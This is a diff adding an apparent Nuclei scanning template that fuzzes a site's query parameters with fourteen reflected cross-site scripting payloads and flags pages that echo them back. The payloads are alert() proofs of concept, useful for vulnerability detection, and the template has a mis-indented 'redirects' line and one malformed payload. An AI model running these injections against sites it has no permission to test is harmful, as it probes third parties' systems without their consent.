@@ -1,0 +1,55 @@
+id: rxss
+
+info:
+  name: rxss
+  author: amahrou1
+  severity: medium
+  tags: rxsss
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    payloads:
+      injection:
+        - '();<test><ScRiPt >window.alert("amahrou")</ScRiPt>'
+        - '"};alert("amahrou");a={"a":'
+        - '--></style></script><script>alert("amahrou")</script>'
+        - '"|alert("amahrou")|"'
+        - '" onerror="alert("amahrou")" a=".jpg'
+        - '>"><svg/onload=alert("amahrou")>'
+        - '"><body onload=alert("amahrou")>'
+        - '</script><script>alert("amahrou")</script>'
+        - '"x:expr/**/ession(alert("amahrou"))"'
+        - 'vulnerable"%3B%20alert(%amahrou%27)%3B%20"'
+        - '<ScRipt>ALeRt("amahrou");</sCRipT>'
+        - '<script>alert("amahrou")</script>'
+        - '"><img src=x onerror=alert("amahrou")>'
+        - '<script>window.alert("amahrou");</script>'
+
+  
+    fuzzing:
+      - part: query
+        type: replace # replaces existing parameter value with fuzz payload
+        mode: multiple # replaces all parameters value with fuzz payload
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+     redirects: true
+    max-redirects: 1
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'alert("amahrou")'
+        part: body
+
+      - type: word
+        words:
+          - "text/html"
+        part: header
+
+      - type: status
+        status:
+          - 200
